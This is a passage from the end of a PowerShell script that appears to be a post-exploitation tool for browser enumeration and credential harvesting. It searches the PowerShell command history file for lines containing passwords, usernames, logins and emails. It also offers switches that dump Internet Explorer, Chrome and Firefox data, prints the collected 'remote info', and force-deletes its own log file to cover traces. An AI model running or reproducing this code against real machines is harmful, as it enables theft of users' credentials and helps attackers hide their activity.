        echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
        echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
        echo "ConsoleHost_history.txt not found .." >> $LogFilePath\BrowserEnum.log
    }else{
        $Path = "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
        $Credentials = Get-Content "$Path"|Select-String -pattern "passw","user","login","email"
        If(-not($Credentials) -or $Credentials -eq $null){
            echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
            echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
            echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
        }else{
            ## Loop in each string found
            $MyPSObject = ForEach($token in $Credentials){
                New-Object -TypeName PSObject -Property @{
                    "Creds in ConsoleHost_history.txt" = $token
                }
            }
            echo "`n" $MyPSObject >> $LogFilePath\BrowserEnum.log
        }
    }
}
 

## Jump Links (Functions)
If($param1 -eq "-IE"){IE_Dump}
If($param1 -eq "-CHROME"){CHROME}
If($param1 -eq "-ADDONS"){ADDONS}
If($param1 -eq "-FIREFOX"){FIREFOX}
If($param1 -eq "-CREDS"){CREDS_DUMP}
If($param1 -eq "-RECON"){BROWSER_RECON}
If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}

## NOTE: ForEach - Build PSObject displays ..
# $StoreData = ForEach ($Key in $Input_String){
#     New-Object -TypeName PSObject -Property @{
#         Data = $Key
#     } 
# }
# Write-Host $StoreData|Out-File "$env:tmp\report.log"

## Retrieve Remote Info from LogFile
Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n";
If($mpset -eq $False){Remove-Item $LogFilePath\BrowserEnum.log -Force}
Exit
